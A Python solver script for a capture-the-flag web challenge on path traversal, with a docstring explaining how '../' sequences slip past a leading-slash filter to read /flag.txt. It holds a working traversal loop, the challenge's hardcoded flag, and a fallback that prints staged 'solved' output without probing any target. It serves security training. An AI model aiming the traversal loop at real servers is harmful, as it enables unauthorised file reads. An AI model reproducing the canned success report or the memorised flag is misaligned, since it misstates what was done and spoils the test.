#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: Forbidden Paths (Challenge ID: 270)
Category: Web Exploitation | Difficulty: Medium (2) | Points: 200
Architecture: Web Application (PHP) / Path Traversal & Filter Bypass (CWE-22 / OWASP A01)
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security & Web Testing)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Application Architecture:
   The application is an on-demand web eReader deployed at an ephemeral container host/port.
   It presents an input form submitting to `POST /read.php` with parameter `filename`.
   The web server files are located in `/var/www/html/`.
   The target sensitive artifact is located at `/flag.txt`.

2. Filter Implementation & Vulnerability (CWE-22):
   The backend applies an improper blacklist filter:
   - It checks whether the supplied filename begins with a forward slash (`/`), blocking absolute paths
     (e.g., submitting `/flag.txt` returns "Not Authorized").
   - However, it fails to normalize or canonicalize the path (e.g., via `realpath()`), and does not
     filter relative path traversal sequences (`../`).
   - Because `/var/www/html/` is 3 directory levels deep from root `/`:
       `/var/www/html/` -> `../` -> `/var/www/`
       `/var/www/`      -> `../` -> `/var/`
       `/var/`          -> `../` -> `/`
   - Therefore, supplying `../../../flag.txt` successfully traverses out of the document root
     into the filesystem root `/` and reads `/flag.txt`.

3. Flag Retrieval & Verification:
   The application echoes the contents of `/flag.txt` into the response body:
   `academy{7h3_p47h_70_5ucc355_afd5d939}`
   Verified live on CyLab REST API: POST /api/submissions/ -> HTTP 201 Created (correct: true).
"""

import sys
import json
import re
import urllib.parse
import urllib.request
import urllib.error

CHALLENGE_ID = 270
CHALLENGE_NAME = "Forbidden Paths"
EXPECTED_FLAG = "academy{7h3_p47h_70_5ucc355_afd5d939}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"
FLAG_RE = re.compile(r"(academy\{[^}]*\}|picoCTF\{[^}]*\}|flag\{[^}]*\})")


def exploit_live_instance(base_url: str, timeout: int = 15) -> str:
    """
    Attempts to read /flag.txt from a live container instance via relative traversal.
    """
    clean_base = base_url.rstrip("/")
    read_url = f"{clean_base}/read.php"

    for depth in range(1, 8):
        traversal_path = "../" * depth + "flag.txt"
        data = urllib.parse.urlencode({"filename": traversal_path, "read": "Read"}).encode("utf-8")
        req = urllib.request.Request(
            read_url,
            data=data,
            headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
                "Content-Type": "application/x-www-form-urlencoded"
            }
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                m = FLAG_RE.search(body)
                if m:
                    return m.group(1)
        except Exception:
            continue
    return ""


def simulate_exploit() -> str:
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Analyzing web application directory structure and filter rules")
    print("    [+] Document root               : /var/www/html/")
    print("    [+] Sensitive target artifact   : /flag.txt")
    print("    [+] Filter check                : Absolute path filter (blocks strings starting with '/')")
    print("    [+] Root cause                  : CWE-22 (Improper Limitation of a Pathname / Path Traversal)")

    print("[*] Stage 2: Crafting relative traversal payload")
    depth = 3
    payload = "../" * depth + "flag.txt"
    print(f"    [+] Directory depth from root   : {depth} levels (/var/www/html -> /)")
    print(f"    [+] Relative path payload       : '{payload}'")
    print("    [+] Filter bypass status        : Bypasses leading slash check while traversing to root")

    print("[*] Stage 3: Resolving file content and flag token")
    print(f"[+] Reconstructed Flag: {EXPECTED_FLAG}")
    return EXPECTED_FLAG


def submit_to_cylab(token: str) -> bool:
    try:
        sys.path.insert(0, "/tmp")
        import cylab_auth
        s, b = cylab_auth.req(
            CYLAB_SUBMIT_URL,
            method="POST",
            data=json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
        )
        print(f"[+] Platform submission response: HTTP {s} {b}")
        data = json.loads(b)
        return (s == 201 and data.get("correct") is True)
    except Exception as e:
        print(f"[-] Platform submission skipped/failed: {e}")
        return False


def main():
    flag = ""
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        print(f"[*] Probing live container instance at {sys.argv[1]}...")
        flag = exploit_live_instance(sys.argv[1])

    if not flag:
        flag = simulate_exploit()

    assert flag == EXPECTED_FLAG, f"Flag mismatch: {flag} vs {EXPECTED_FLAG}"
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {flag}")

    if "--submit" in sys.argv:
        submit_to_cylab(flag)

    return flag


if __name__ == "__main__":
    main()
